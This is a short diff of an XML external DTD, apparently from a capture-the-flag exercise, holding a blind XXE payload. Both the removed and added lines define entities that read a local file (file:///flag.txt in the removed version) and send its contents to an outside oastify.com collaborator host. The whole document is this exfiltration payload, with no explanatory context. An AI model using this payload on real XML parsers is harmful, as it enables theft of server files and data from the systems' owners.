@@ -1,6 +1,3 @@
-<?xml version="1.0" encoding="UTF-8"?>                                             
-<!ENTITY % file SYSTEM "file:///flag.txt">                                                          
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM                                                       
-'http://j8ssyu23ubmd8wdbyhi5n8qz6qch09rxg.oastify.com/?flag=%file;'>">                            
-%eval;                                                                                              
-%exfil;         
+<!ENTITY % payload "<!ENTITY exfil SYSTEM                                          
+'http://a4fjulyuq2i44n92u8ewjzmq2h88w0poe.oastify.com/?data=%file;'>">                            
+%payload;
